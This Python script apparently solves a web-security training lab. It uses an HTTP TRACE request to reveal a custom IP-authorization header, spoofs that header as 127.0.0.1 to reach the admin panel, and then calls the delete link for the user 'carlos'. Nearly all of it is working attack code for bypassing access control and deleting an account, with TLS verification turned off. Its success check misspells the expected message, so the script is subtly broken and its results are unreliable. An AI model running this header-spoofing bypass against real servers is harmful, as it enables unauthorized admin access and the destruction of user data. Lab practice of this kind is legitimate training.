import requests
import sys
import re
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def information_disclosure_exploit(session, url) :

    headers = {'X-Custom-Ip-Authorization': '127.0.0.1'}    

    # Perform a TRACE request
    trace_request = requests.Request('TRACE', url)
    trace_prepared = session.prepare_request(trace_request)
    trace_response = session.send(trace_prepared)

    # Check the TRACE response
    if trace_response.status_code == 200:
        print(trace_response.text)
    else:
        print(f"TRACE request failed with status code {trace_response.status_code}")

    res = session.get(url + '/admin', headers=headers, verify=False, proxies=proxies)

    # Parse the HTML response
    soup = BeautifulSoup(res.text, "html.parser")

    # Use a regular expression to extract URLs containing "/delete"
    pattern = r'href="(.*\/delete[^"]+)"'
    delete_urls = re.findall(pattern, str(soup))
    delete_url = ""
    
    for elt in delete_urls :
        if 'carlos' in elt :
            delete_url = elt

    exploit_url = url+delete_url

    r = session.get(exploit_url, verify=False, headers=headers, proxies=proxies)
    
    if "Congartulations" in r.text :
        print("The carlos user has been deleted !")
        print("You have solved the lab")
    else :
        print("Failed to exploit the information disclosure flaw!")

if __name__ == "__main__" :
    try :
        url = sys.argv[1].strip()
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    session = requests.Session()
    information_disclosure_exploit(session, url)